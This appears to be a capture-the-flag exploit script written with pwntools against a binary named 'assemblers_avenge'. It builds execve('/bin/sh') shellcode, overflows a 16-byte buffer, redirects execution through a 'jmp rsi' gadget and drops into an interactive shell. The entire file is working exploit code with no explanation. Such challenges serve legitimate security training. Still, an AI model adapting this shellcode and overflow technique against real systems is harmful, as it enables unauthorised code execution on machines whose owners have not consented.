#!/usr/bin/python3
from pwn import process, context, p64, asm

shell = process("./assemblers_avenge")
context.arch = "amd64"

shellcode  = b""
shellcode += asm("push 0x3b")         # execve()
shellcode += asm("pop rax")           # $rax = execve()
shellcode += asm("mov rdi, 0x402065") # $rdi = &"/bin/sh"
shellcode += asm("xor rsi, rsi")      # $rsi = NULL
shellcode += asm("cdq")               # $rdx = NULL
shellcode += asm("syscall")           # execve("/bin/sh", NULL, NULL);

offset = 16
junk = b"A" * (offset - len(shellcode))

payload  = b""
payload += shellcode
payload += junk
payload += p64(0x40106b) # jmp rsi

shell.recvlines(3)
shell.sendline(payload)
shell.interactive()
